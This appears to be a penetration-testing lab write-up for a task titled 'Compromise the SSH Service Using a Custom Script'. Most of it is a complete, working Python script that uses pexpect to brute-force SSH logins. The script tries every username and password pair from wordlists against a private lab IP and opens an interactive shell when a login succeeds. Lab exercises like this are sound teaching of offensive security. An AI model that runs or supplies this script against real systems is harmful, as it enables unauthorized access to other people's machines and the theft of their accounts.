# Phase 1: Setup and Compromise the SSH Service

## 🧠 Task 1.2: Compromise the SSH Service Using a Custom Script

In this task, instead of using Metasploit, we demonstrate how to automate the SSH brute-force attack using a custom Python script. The script utilizes the `pexpect` library to interact with the SSH process directly, handling prompts and testing username/password combinations.

---

## 🔹 Step 1: Execute the Custom Brute-Force Script

We created a script called `SSH_exploitScript.py` that:
- Loads usernames and passwords from two separate files.
- Tries all combinations on the target IP (`192.168.56.102`).
- Reports any successful login attempts.

```python
import pexpect
import sys

def main():
    ip = "192.168.56.102"
    user_file = "/home/kali/Desktop/username"
    pass_file = "/home/kali/Desktop/password"

    try:
        with open(user_file) as uf, open(pass_file) as pf:
            users = [u.strip() for u in uf if u.strip()]
            passwords = [p.strip() for p in pf if p.strip()]
    except Exception as e:
        print(f"[!] Error opening wordlists: {e}")
        sys.exit(1)

    for user in users:
        for password in passwords:
            print(f"[*] Trying {user}:{password}")
            try:
                child = pexpect.spawn(f"ssh {user}@{ip}", timeout=10)
                i = child.expect([
                    r"Are you sure you want to continue connecting \\(yes/no\\)\\?",
                    r"[Pp]assword:",
                    pexpect.TIMEOUT,
                    pexpect.EOF
                ])
                if i == 0:
                    child.sendline("yes")
                    i = child.expect([r"[Pp]assword:", pexpect.TIMEOUT, pexpect.EOF])
                if i == 1:
                    child.sendline(password)
                    j = child.expect([
                        r"Permission denied",
                        r"[#$]\\s",
                        pexpect.TIMEOUT,
                        pexpect.EOF
                    ], timeout=10)

                    if j == 1:
                        print(f"[+] SUCCESS: {user}:{password}")
                        child.interact()
                        return
                    else:
                        print(f"[-] Failed: {user}:{password}")
                else:
                    print(f"[-] No password prompt for {user}@{ip}")
                child.close()
            except pexpect.ExceptionPexpect as e:
                print(f"[!] Exception with {user}:{password} -> {e}")

    print("[-] Brute‑force complete. No valid credentials found.")

if __name__ == "__main__":
    main()
```


